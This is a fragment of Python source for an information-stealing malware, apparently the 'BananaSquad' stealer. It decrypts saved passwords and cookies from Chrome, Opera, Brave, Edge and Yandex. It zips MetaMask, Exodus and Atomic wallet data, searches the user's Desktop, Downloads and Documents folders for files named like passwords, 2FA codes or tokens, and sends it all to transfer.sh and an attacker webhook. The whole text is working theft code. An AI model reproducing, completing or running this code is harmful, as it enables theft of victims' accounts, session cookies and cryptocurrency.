            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except:
            pass


def Trust(Cookies):
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED




def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, tk=''):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "bc_checking":
        data = {
        "files": tk,
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    path = name
    files = {'file': open(path, 'rb')}

    if "bc_allpasswords" in name:

        ra = ' | '.join(da for da in paswWords)

        if len(ra) > 1000:
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
        "content": '',
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

    if "bc_allcookies" in name:
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000:
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)

        data = {
        "content": '',
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

    LoadRequests("POST", hook, files=files)

def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"BANANASQUAD | https://bananasquad.ru\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")



Passw = []
def getPassw(path, arg):
    global Passw
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "bananasquad" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    shutil.copy2(pathC, tempfold)
    conn = connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"URL: {row[0]} \n ID: {row[1]} \n PASSW0RD: {DecryptValue(row[2], master_key)}\n\n")
    writeforfile(Passw, 'bc_allpasswords')

Cookies = []
def getCookie(path, arg):
    global Cookies
    if not os.path.exists(path): return

    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "bananasquad" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"

    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
                    
            Cookies.append(f"{row[0]}	TRUE"+"		"+ f"/FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
            
    writeforfile(Cookies, 'bc_allcookies')

def checkIfProcessRunning(processName):
    '''
    Check if there is any running process that contains the given name processName.
    '''
    #Iterate over the all the running process
    for proc in psutil.process_iter():
        try:
            # Check if process name contains the given name string.
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;


def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    if "aholpfdialjgjfhomihkjbmgjidlcdno" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Exodus_{browser}"
        pathC = path + arg

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg

    if not os.path.exists(pathC): return
    if checkIfProcessRunning('chrome.exe'):
        print('Yes a chrome process was running')
        subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    else:
        ...
        

    if "Wallet" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    zf = zipfile.ZipFile(f"{pathC}/{name}.zip", "w")
    print(zf)
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    upload(f'{pathC}/{name}.zip')
    os.remove(f"{pathC}/{name}.zip")


def grabb_GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]



    Paths_zipped = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
    ]


    for patt in browserPaths:
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    thread_bccookies = []
    for patt in browserPaths:
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        thread_bccookies.append(a)

    for thread in thread_bccookies: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return

    for patt in browserPaths:
        threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()

    for patt in Paths_zipped:
        threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()

    for thread in Threadlist:
        thread.join()
    global upths
    upths = []

    for file in ["bc_allpasswords.txt", "bc_allcookies.txt"]:
        upload(os.getenv("TEMP") + "\\" + file)


def bc_uploadanonfiles(path):
    try:

        files = { "file": (path, open(path, mode='rb')) }
        ...
        upload = requests.post("https://transfer.sh/", files=files)
        url = upload.text
        return url
    except:
        return False

def bc_Folder_create(pathF, keywords):
    global bc_create_files
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = bc_uploadanonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    bc_create_files.append(["folder", pathF + "/", ffound])

bc_create_files = []
def bc_create_file(path, keywords):
    global bc_create_files
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, bc_uploadanonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    bc_Folder_create(target, keywords)
                    break

    bc_create_files.append(["folder", path, fifound])

def bc_checking():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]



    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "seecret"
        ]

    wikith = []
    for patt in path2search:
        bc_checking = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles]);bc_checking.start()
        wikith.append(bc_checking)
    return wikith


global keyword, cookiWords, paswWords

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]


cookiWords = []
paswWords = []

grabb_GatherAll()
DETECTED = Trust(Cookies)

if not DETECTED:
    wikith = bc_checking()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = ""
    for arg in bc_create_files:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"{b}"


    upload("bc_checking", filetext)
    auto = threading.Thread(target=auto_copy_wallet().run)
    auto.start()
